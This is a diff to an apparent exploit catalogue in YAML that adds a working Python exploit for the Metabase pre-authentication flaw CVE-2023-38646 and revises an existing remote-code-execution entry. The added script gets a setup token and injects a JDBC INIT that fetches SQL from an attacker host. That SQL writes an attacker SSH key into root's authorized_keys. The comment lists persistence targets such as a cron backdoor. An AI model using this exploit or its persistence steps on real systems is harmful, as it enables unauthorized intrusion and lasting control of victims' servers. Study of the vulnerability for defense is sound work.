@@ -119,6 +119,49 @@ functions:
       unauthenticated:
     version: |
       open source < 0.46.6.1 / Enterprise < 1.46.6.1
+  file-write:
+  - code: |
+      #!/usr/bin/env python3
+      # CVE-2023-38646: write arbitrary files via H2 Java FileWriter binding
+      # Host write.sql on the attacker machine (python3 -m http.server 8888)
+      # write.sql content (adjust OUTPATH and CONTENT):
+      #   CREATE ALIAS IF NOT EXISTS FILE_WRITE AS $$ void fw(String p, String c)
+      #   throws Exception { java.io.FileWriter w=new java.io.FileWriter(p);
+      #   w.write(c); w.close(); }$$;
+      #   CALL FILE_WRITE('/root/.ssh/authorized_keys',
+      #     'ssh-ed25519 AAAA...attacker_pubkey... attacker\n');
+
+      import requests
+
+      BASE          = "http://victim.com"
+      WRITE_SQL_URL = "http://attacker.com:8888/write.sql"
+
+      token = requests.get(f"{BASE}/api/session/properties").json()["setup-token"]
+
+      jdbc = (
+          "zip:./metabase.jar!/sample-database.db"
+          ";TRACE_LEVEL_SYSTEM_OUT=3"
+          f";INIT=RUNSCRIPT FROM '{WRITE_SQL_URL}'"
+      )
+      resp = requests.post(f"{BASE}/api/setup/validate", json={
+          "token": token,
+          "details": {
+              "is_full_sync": True, "is_on_demand": False, "name": "x",
+              "engine": "h2", "details": {"db": jdbc}
+          }
+      })
+      print(resp.status_code)
+    comment: "CVE-2023-38646: writes arbitrary files via H2 Java FileWriter binding\
+      \ in the JDBC\nINIT parameter. The write.sql script must be hosted on a server\
+      \ reachable from the\nMetabase host.\n\nUseful write targets (Metabase typically\
+      \ runs as root in containers):\n- /root/.ssh/authorized_keys  (persistent SSH\
+      \ access)\n- /etc/cron.d/backdoor  (cron-based persistence)\n- /proc/1/fd/<n>\
+      \  (pipe injection into running processes)\n\nMetabase does not execute PHP\
+      \ or JSP \u2014 use file-write for OS-level persistence\nrather than a webshell.\n"
+    contexts:
+      unauthenticated:
+    version: |
+      open source < 0.46.6.1 / Enterprise < 1.46.6.1
   rce:
   - blind: true
     code: |
@@ -154,14 +197,15 @@ functions:
           }
       })
       print(resp.text)
-    comment: "CVE-2023-38646: the H2 INIT parameter in the JDBC URL is executed as\
-      \ SQL during\nconnection setup. RUNSCRIPT FROM fetches and executes a remote\
-      \ SQL file, which\nuses CREATE ALIAS to bind a Java method and execute OS commands.\n\
-      \nThe zip: URI points to the H2 sample database bundled inside metabase.jar,\n\
-      avoiding the need to reference an external database file.\n\nrce.sql must be\
-      \ hosted on a server reachable from the Metabase host. Command\noutput is not\
-      \ returned in the HTTP response \u2014 write output to a file or use the\nreverse\
-      \ shell entry for interactive access.\n\nRef: https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646\n"
+    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2023-38646:\
+      \ the H2 INIT parameter in the JDBC URL is executed as SQL during\nconnection\
+      \ setup. RUNSCRIPT FROM fetches and executes a remote SQL file, which\nuses\
+      \ CREATE ALIAS to bind a Java method and execute OS commands.\n\nThe zip: URI\
+      \ points to the H2 sample database bundled inside metabase.jar,\navoiding the\
+      \ need to reference an external database file.\n\nrce.sql must be hosted on\
+      \ a server reachable from the Metabase host. Command\noutput is not returned\
+      \ in the HTTP response \u2014 write output to a file or use the\nreverse shell\
+      \ entry for interactive access.\n\nRef: https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646\n"
     contexts:
       unauthenticated:
     version: |-
